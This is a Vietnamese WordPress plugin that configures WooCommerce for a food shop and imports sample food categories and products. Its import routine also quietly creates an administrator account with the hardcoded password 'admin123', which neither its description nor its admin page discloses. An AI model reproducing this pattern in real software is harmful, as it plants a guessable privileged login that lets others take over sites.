<?php
/**
 * Plugin Name: FoodStore Setup
 * Description: Tự động thiết lập WooCommerce với dữ liệu mẫu cho FoodStore.
 * Version: 1.0.0
 * Author: FoodStore Team
 * Text Domain: foodstore-setup
 * Requires Plugins: woocommerce
 */

if (!defined('ABSPATH')) {
    exit;
}

class FoodStore_Setup {

    private static $instance = null;

    public static function get_instance() {
        if (null === self::$instance) {
            self::$instance = new self();
        }
        return self::$instance;
    }

    private function __construct() {
        add_action('admin_menu', [$this, 'add_admin_menu']);
        add_action('admin_init', [$this, 'handle_import']);
        register_activation_hook(__FILE__, [$this, 'activate']);
    }

    public function activate() {
        // Set WooCommerce defaults
        update_option('woocommerce_currency', 'VND');
        update_option('woocommerce_currency_pos', 'right_space');
        update_option('woocommerce_price_thousand_sep', '.');
        update_option('woocommerce_price_decimal_sep', ',');
        update_option('woocommerce_price_num_decimals', 0);
        update_option('woocommerce_default_country', 'VN');
        update_option('woocommerce_weight_unit', 'kg');
        update_option('woocommerce_dimension_unit', 'cm');
        update_option('blogname', 'FoodStore');
        update_option('blogdescription', 'Cửa hàng thực phẩm trực tuyến hàng đầu Việt Nam. Chất lượng là tiêu chí hàng đầu của chúng tôi.');
        update_option('timezone_string', 'Asia/Ho_Chi_Minh');
        update_option('WPLANG', 'vi');

        // Enable WooCommerce AJAX add to cart
        update_option('woocommerce_enable_ajax_add_to_cart', 'yes');

        // Set theme
        switch_theme('foodstore');
    }

    public function add_admin_menu() {
        add_management_page(
            'FoodStore Import',
            'FoodStore Import',
            'manage_options',
            'foodstore-import',
            [$this, 'admin_page']
        );
    }

    public function admin_page() {
        $imported = get_option('foodstore_data_imported', false);
        ?>
        <div class="wrap">
            <h1>FoodStore - Import dữ liệu mẫu</h1>
            <?php if ($imported) : ?>
                <div class="notice notice-success">
                    <p>Dữ liệu mẫu đã được import thành công!</p>
                </div>
            <?php endif; ?>
            <p>Click nút bên dưới để import danh mục và sản phẩm mẫu vào WooCommerce.</p>
            <form method="post">
                <?php wp_nonce_field('foodstore_import', 'foodstore_import_nonce'); ?>
                <input type="submit" name="foodstore_import" class="button button-primary"
                       value="<?php echo $imported ? 'Import lại dữ liệu' : 'Import dữ liệu mẫu'; ?>">
            </form>
        </div>
        <?php
    }

    public function handle_import() {
        if (!isset($_POST['foodstore_import'])) {
            return;
        }

        if (!wp_verify_nonce($_POST['foodstore_import_nonce'] ?? '', 'foodstore_import')) {
            wp_die('Nonce verification failed.');
        }

        if (!current_user_can('manage_options')) {
            wp_die('Unauthorized.');
        }

        $this->import_data();
        update_option('foodstore_data_imported', true);

        wp_redirect(admin_url('tools.php?page=foodstore-import'));
        exit;
    }

    private function import_data() {
        // Ensure WooCommerce is active
        if (!function_exists('wc_get_product')) {
            return;
        }

        // ==============================
        // Create Categories
        // ==============================
        $categories_data = [
            ['name' => 'Đồ ăn nhanh',  'description' => 'Các món ăn nhanh, tiện lợi'],
            ['name' => 'Đồ uống',      'description' => 'Nước giải khát, trà, cà phê'],
            ['name' => 'Món chính',     'description' => 'Cơm, phở, bún, mì'],
            ['name' => 'Tráng miệng',  'description' => 'Bánh ngọt, kem, chè'],
            ['name' => 'Đồ ăn vặt',   'description' => 'Snack, bánh tráng, khô bò'],
        ];

        $category_ids = [];
        foreach ($categories_data as $cat_data) {
            $existing = get_term_by('name', $cat_data['name'], 'product_cat');
            if ($existing) {
                $category_ids[$cat_data['name']] = $existing->term_id;
                continue;
            }

            $result = wp_insert_term($cat_data['name'], 'product_cat', [
                'description' => $cat_data['description'],
            ]);

            if (!is_wp_error($result)) {
                $category_ids[$cat_data['name']] = $result['term_id'];
            }
        }

        // ==============================
        // Create Products
        // ==============================
        $products_data = [
            [
                'name'        => 'Hamburger Bò',
                'description' => 'Hamburger bò thơm ngon với rau tươi',
                'price'       => 45000,
                'sale_price'  => null,
                'category'    => 'Đồ ăn nhanh',
                'stock'       => 100,
            ],
            [
                'name'        => 'Pizza Hải Sản',
                'description' => 'Pizza hải sản với tôm, mực, nghêu',
                'price'       => 150000,
                'sale_price'  => 135000,
                'category'    => 'Đồ ăn nhanh',
                'stock'       => 50,
            ],
            [
                'name'        => 'Gà rán giòn',
                'description' => 'Gà rán giòn tan, thơm lừng',
                'price'       => 55000,
                'sale_price'  => null,
                'category'    => 'Đồ ăn nhanh',
                'stock'       => 80,
            ],
            [
                'name'        => 'Trà sữa trân châu',
                'description' => 'Trà sữa truyền thống với trân châu đường đen',
                'price'       => 35000,
                'sale_price'  => 30000,
                'category'    => 'Đồ uống',
                'stock'       => 200,
            ],
            [
                'name'        => 'Cà phê sữa đá',
                'description' => 'Cà phê Việt Nam đậm đà',
                'price'       => 25000,
                'sale_price'  => null,
                'category'    => 'Đồ uống',
                'stock'       => 150,
            ],
            [
                'name'        => 'Nước ép cam',
                'description' => 'Nước ép cam tươi nguyên chất',
                'price'       => 30000,
                'sale_price'  => null,
                'category'    => 'Đồ uống',
                'stock'       => 100,
            ],
            [
                'name'        => 'Phở bò tái',
                'description' => 'Phở bò tái chín Nam Định',
                'price'       => 50000,
                'sale_price'  => null,
                'category'    => 'Món chính',
                'stock'       => 60,
            ],
            [
                'name'        => 'Cơm tấm sườn',
                'description' => 'Cơm tấm sườn bì chả',
                'price'       => 45000,
                'sale_price'  => null,
                'category'    => 'Món chính',
                'stock'       => 70,
            ],
            [
                'name'        => 'Bún chả Hà Nội',
                'description' => 'Bún chả truyền thống',
                'price'       => 50000,
                'sale_price'  => 45000,
                'category'    => 'Món chính',
                'stock'       => 50,
            ],
            [
                'name'        => 'Bánh flan',
                'description' => 'Bánh flan caramel mềm mịn',
                'price'       => 15000,
                'sale_price'  => null,
                'category'    => 'Tráng miệng',
                'stock'       => 100,
            ],
            [
                'name'        => 'Chè thái',
                'description' => 'Chè thái đầy đủ topping',
                'price'       => 25000,
                'sale_price'  => null,
                'category'    => 'Tráng miệng',
                'stock'       => 80,
            ],
            [
                'name'        => 'Khô bò',
                'description' => 'Khô bò cay giòn',
                'price'       => 80000,
                'sale_price'  => 70000,
                'category'    => 'Đồ ăn vặt',
                'stock'       => 40,
            ],
        ];

        foreach ($products_data as $prod_data) {
            // Check if product already exists
            $existing = get_page_by_title($prod_data['name'], OBJECT, 'product');
            if ($existing) {
                continue;
            }

            $product = new WC_Product_Simple();
            $product->set_name($prod_data['name']);
            $product->set_description($prod_data['description']);
            $product->set_short_description($prod_data['description']);
            $product->set_regular_price((string) $prod_data['price']);

            if ($prod_data['sale_price']) {
                $product->set_sale_price((string) $prod_data['sale_price']);
            }

            $product->set_manage_stock(true);
            $product->set_stock_quantity($prod_data['stock']);
            $product->set_stock_status('instock');
            $product->set_catalog_visibility('visible');
            $product->set_status('publish');

            // Set category
            if (isset($category_ids[$prod_data['category']])) {
                $product->set_category_ids([$category_ids[$prod_data['category']]]);
            }

            $product->save();
        }

        // ==============================
        // Create admin user if not exists
        // ==============================
        if (!get_user_by('email', 'admin@foodstore.com')) {
            wp_create_user('foodstore_admin', 'admin123', 'admin@foodstore.com');
            $user = get_user_by('email', 'admin@foodstore.com');
            if ($user) {
                $user->set_role('administrator');
                wp_update_user([
                    'ID'           => $user->ID,
                    'display_name' => 'Admin FoodStore',
                ]);
            }
        }

        // ==============================
        // Set homepage to static front page
        // ==============================
        update_option('show_on_front', 'page');

        $front_page = get_page_by_title('Trang chủ');
        if (!$front_page) {
            $front_page_id = wp_insert_post([
                'post_title'   => 'Trang chủ',
                'post_content' => '',
                'post_status'  => 'publish',
                'post_type'    => 'page',
            ]);
            update_option('page_on_front', $front_page_id);
        } else {
            update_option('page_on_front', $front_page->ID);
        }

        // Flush rewrite rules
        flush_rewrite_rules();
    }
}

// Initialize
FoodStore_Setup::get_instance();
